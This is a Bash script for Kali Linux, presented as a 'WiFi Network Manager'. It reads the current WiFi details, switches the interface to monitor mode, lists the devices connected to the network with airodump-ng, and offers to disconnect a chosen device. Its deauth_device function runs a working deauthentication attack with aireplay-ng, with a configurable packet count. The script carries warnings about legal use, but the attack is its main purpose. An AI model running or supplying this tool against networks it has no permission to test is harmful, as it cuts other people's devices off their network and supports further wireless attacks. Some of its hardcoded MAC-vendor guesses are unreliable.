#!/bin/bash

# WiFi Network Manager
# A tool for WiFi analysis, device scanning, and targeted device disconnection
# For Kali Linux

# Check if script is run as root
if [ "$(id -u)" != "0" ]; then
   echo "This script must be run as root" 1>&2
   exit 1
fi

# Colors for terminal output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Dependencies check
dependencies=("airmon-ng" "airodump-ng" "aireplay-ng" "nmap" "macchanger" "nmcli" "ip")
missing_deps=0

echo -e "${BLUE}Checking dependencies...${NC}"
for dep in "${dependencies[@]}"; do
    if ! command -v $dep &> /dev/null; then
        echo -e "${RED}$dep is not installed.${NC}"
        missing_deps=1
    fi
done

if [ $missing_deps -eq 1 ]; then
    echo -e "${YELLOW}Please install missing dependencies with:${NC}"
    echo -e "${CYAN}sudo apt-get update && sudo apt-get install aircrack-ng nmap macchanger network-manager${NC}"
    exit 1
fi

# Trap ctrl-c and clean up
trap cleanup INT

cleanup() {
    echo -e "\n${YELLOW}Cleaning up...${NC}"
    # Reset interface if we put it in monitor mode
    if [ ! -z "$monitor_interface" ]; then
        airmon-ng stop "$monitor_interface" > /dev/null 2>&1
    fi
    # Remove temporary files
    rm -f /tmp/airodump-* 2>/dev/null
    exit 0
}

# Get current interface and wifi information
get_wifi_info() {
    echo -e "${BLUE}Getting current WiFi information...${NC}"
    
    # Try to get the interface with an active connection
    current_interface=$(nmcli -t -f DEVICE,STATE device | grep ":connected" | cut -d':' -f1)
    
    if [ -z "$current_interface" ]; then
        echo -e "${RED}No active WiFi connection found.${NC}"
        read -p "Enter your WiFi interface name (e.g. wlan0): " current_interface
        
        if [ -z "$current_interface" ]; then
            echo -e "${RED}No interface provided. Exiting.${NC}"
            exit 1
        fi
    fi
    
    # Get SSID
    ssid=$(nmcli -t -f GENERAL.CONNECTION device show "$current_interface" 2>/dev/null | cut -d':' -f2)
    if [ -z "$ssid" ]; then
        ssid="Not connected"
    fi
    
    # Get MAC address
    mac_address=$(ip link show "$current_interface" | grep link/ether | awk '{print $2}')
    
    # Get signal strength and security
    if [ "$ssid" != "Not connected" ]; then
        signal_strength=$(nmcli -f IN-USE,SIGNAL device wifi | grep "*" | awk '{print $2}')
        security=$(nmcli -f SECURITY device wifi | grep -A 1 IN-USE | tail -1 | xargs)
        bssid=$(nmcli -t -f GENERAL.BSSID device show "$current_interface" 2>/dev/null | cut -d':' -f2- | xargs)
        channel=$(iwlist "$current_interface" channel | grep Current | sed 's/.*Channel \([0-9]*\).*/\1/')
    else
        signal_strength="N/A"
        security="N/A"
        bssid="N/A"
        channel="N/A"
    fi
    
    # Display WiFi info
    clear
    echo -e "${GREEN}====================================${NC}"
    echo -e "${GREEN}        WiFi Information           ${NC}"
    echo -e "${GREEN}====================================${NC}"
    echo -e "${CYAN}Interface:${NC} $current_interface"
    echo -e "${CYAN}MAC Address:${NC} $mac_address"
    echo -e "${CYAN}SSID:${NC} $ssid"
    echo -e "${CYAN}BSSID:${NC} $bssid"
    echo -e "${CYAN}Channel:${NC} $channel"
    echo -e "${CYAN}Signal Strength:${NC} $signal_strength%"
    echo -e "${CYAN}Security:${NC} $security"
    echo -e "${GREEN}====================================${NC}"
    
    return 0
}

# Put interface in monitor mode
enable_monitor_mode() {
    echo -e "\n${BLUE}Enabling monitor mode on $current_interface...${NC}"
    
    # Kill processes that might interfere with monitor mode
    airmon-ng check kill > /dev/null 2>&1
    
    # Put interface in monitor mode
    airmon-ng start "$current_interface" > /dev/null 2>&1
    
    # Get the name of the monitor interface (might be different from original)
    monitor_interface=$(iwconfig 2>/dev/null | grep "Mode:Monitor" | awk '{print $1}')
    
    if [ -z "$monitor_interface" ]; then
        # Try alternative naming convention
        monitor_interface="${current_interface}mon"
        if ! iwconfig "$monitor_interface" &>/dev/null; then
            echo -e "${RED}Failed to enable monitor mode. Exiting.${NC}"
            exit 1
        fi
    fi
    
    echo -e "${GREEN}Monitor mode enabled on $monitor_interface${NC}"
    return 0
}

# Scan for connected devices
scan_devices() {
    if [ "$ssid" == "Not connected" ]; then
        echo -e "${RED}Not connected to any network. Cannot scan devices.${NC}"
        return 1
    fi
    
    echo -e "\n${BLUE}Scanning for connected devices on $ssid...${NC}"
    echo -e "${YELLOW}This will temporarily enable monitor mode.${NC}"
    read -p "Continue (y/n)? " -n 1 -r
    echo
    
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        return 1
    fi
    
    # Enable monitor mode
    enable_monitor_mode
    
    # Create temporary files for scan results
    temp_file="/tmp/airodump-scan"
    
    echo -e "${BLUE}Scanning network traffic for 15 seconds...${NC}"
    echo -e "${YELLOW}Press Ctrl+C to stop scanning early${NC}"
    
    # Start airodump to collect data
    airodump-ng -c "$channel" --bssid "$bssid" -w "$temp_file" "$monitor_interface" > /dev/null 2>&1 &
    airodump_pid=$!
    
    # Show a spinner while scanning
    spin='-\|/'
    i=0
    end=$((SECONDS+15))
    
    while [ $SECONDS -lt $end ]; do
        i=$(( (i+1) % 4 ))
        printf "\r${BLUE}Scanning: ${spin:$i:1} %d seconds remaining...${NC}" $((end-SECONDS))
        sleep .5
    done
    
    # Kill airodump
    kill $airodump_pid 2>/dev/null
    wait $airodump_pid 2>/dev/null
    
    # Reset interface back to managed mode
    airmon-ng stop "$monitor_interface" > /dev/null 2>&1
    service NetworkManager restart > /dev/null 2>&1
    
    # Wait for network to reconnect
    echo -e "\n${BLUE}Waiting for network to reconnect...${NC}"
    sleep 3
    
    # Parse the CSV file to get client information
    csv_file="${temp_file}-01.csv"
    
    if [ ! -f "$csv_file" ]; then
        echo -e "${RED}Scan results not found. Please try again.${NC}"
        return 1
    fi
    
    # Extract client information from CSV
    # Skip header lines and get the client section
    clients=$(awk -F, 'NR>5 {print $1","$6}' "$csv_file" | grep -v "Station MAC")
    
    if [ -z "$clients" ]; then
        echo -e "${RED}No clients found connected to this network.${NC}"
        return 1
    fi
    
    # Display the clients
    clear
    echo -e "${GREEN}====================================${NC}"
    echo -e "${GREEN}    Connected Devices on $ssid     ${NC}"
    echo -e "${GREEN}====================================${NC}"
    echo -e "${CYAN}MAC Address          Vendor/Device Type${NC}"
    echo -e "${GREEN}------------------------------------${NC}"
    
    declare -A device_list
    count=1
    
    while IFS=, read -r mac_addr power; do
        mac_addr=$(echo "$mac_addr" | xargs)
        
        # Use nmap to try to identify the device
        vendor=$(nmap --script broadcast-dhcp-discover -e "$current_interface" | grep -i "$mac_addr" -A 3 | grep "Vendor" | cut -d':' -f2 | xargs)
        
        # If vendor not found via DHCP, try MAC lookup
        if [ -z "$vendor" ]; then
            vendor=$(macchanger -l | grep "$(echo $mac_addr | cut -d':' -f1,2,3)" | cut -d' ' -f5- | xargs)
        fi
        
        # If still no vendor, try another approach or mark as unknown
        if [ -z "$vendor" ]; then
            # Try to identify device type based on MAC prefix
            if [[ "$mac_addr" == "00:0C:29"* ]]; then
                vendor="VMware Virtual Machine"
            elif [[ "$mac_addr" == "08:00:27"* ]]; then
                vendor="VirtualBox Virtual Machine"
            elif [[ "$mac_addr" == "00:1A:11"* ]]; then
                vendor="Google Device"
            elif [[ "$mac_addr" == "B8:27:EB"* || "$mac_addr" == "DC:A6:32"* ]]; then
                vendor="Raspberry Pi"
            elif [[ "$mac_addr" == "00:11:22"* ]]; then
                vendor="Android Device"
            elif [[ "$mac_addr" == "A4:C6:4F"* || "$mac_addr" == "00:25:00"* ]]; then
                vendor="Apple Device"
            else
                vendor="Unknown Device"
            fi
        fi
        
        echo -e "${YELLOW}$count)${NC} $mac_addr  $vendor"
        device_list[$count]=$mac_addr
        ((count++))
    done <<< "$clients"
    
    echo -e "${GREEN}====================================${NC}"
    
    # Option to select a device to deauthenticate
    echo -e "\n${BLUE}Would you like to disconnect a device? (y/n)${NC}"
    read -n 1 -r
    echo
    
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        echo -e "${BLUE}Enter the number of the device to disconnect:${NC}"
        read device_number
        
        if [ -z "${device_list[$device_number]}" ]; then
            echo -e "${RED}Invalid selection.${NC}"
            return 1
        fi
        
        deauth_device "${device_list[$device_number]}"
    fi
    
    return 0
}

# Disconnect a device from the network
deauth_device() {
    target_mac=$1
    
    echo -e "\n${BLUE}Preparing to disconnect device: $target_mac${NC}"
    echo -e "${RED}Warning: Disconnecting devices from networks you don't own may be illegal.${NC}"
    echo -e "${YELLOW}Use this feature only on networks you own or have permission to test.${NC}"
    echo -e "${BLUE}How many deauthentication packets to send? (10-100, more = longer disconnection)${NC}"
    read packet_count
    
    # Validate input
    if ! [[ "$packet_count" =~ ^[0-9]+$ ]] || [ "$packet_count" -lt 10 ] || [ "$packet_count" -gt 100 ]; then
        echo -e "${RED}Invalid input. Using default of 30 packets.${NC}"
        packet_count=30
    fi
    
    # Enable monitor mode
    enable_monitor_mode
    
    echo -e "${BLUE}Sending $packet_count deauthentication packets to $target_mac...${NC}"
    echo -e "${YELLOW}This will disconnect the device temporarily.${NC}"
    
    # Send deauth packets
    aireplay-ng -0 "$packet_count" -a "$bssid" -c "$target_mac" "$monitor_interface" > /dev/null 2>&1
    
    echo -e "${GREEN}Deauthentication attack completed.${NC}"
    
    # Reset interface back to managed mode
    airmon-ng stop "$monitor_interface" > /dev/null 2>&1
    service NetworkManager restart > /dev/null 2>&1
    
    echo -e "${BLUE}Waiting for network to reconnect...${NC}"
    sleep 3
    
    return 0
}

# Main menu
show_menu() {
    echo -e "\n${BLUE}What would you like to do?${NC}"
    echo -e "${YELLOW}1)${NC} Refresh WiFi information"
    echo -e "${YELLOW}2)${NC} Scan for connected devices"
    echo -e "${YELLOW}3)${NC} Exit"
    read -p "Select option [1-3]: " option
    
    case $option in
        1) get_wifi_info ;;
        2) scan_devices ;;
        3) cleanup ;;
        *) echo -e "${RED}Invalid option${NC}" ;;
    esac
}

# Main program
clear
echo -e "${GREEN}====================================${NC}"
echo -e "${GREEN}  WiFi Manager for Kali Linux      ${NC}"
echo -e "${GREEN}====================================${NC}"
echo -e "${YELLOW}This tool allows you to analyze WiFi networks, scan connected devices,${NC}"
echo -e "${YELLOW}and selectively disconnect devices from your network.${NC}"
echo -e "${RED}Warning: Use responsibly and only on networks you own or have permission to test.${NC}"
echo -e "${GREEN}====================================${NC}"

# Get initial WiFi information
get_wifi_info

# Main loop
while true; do
    show_menu
done
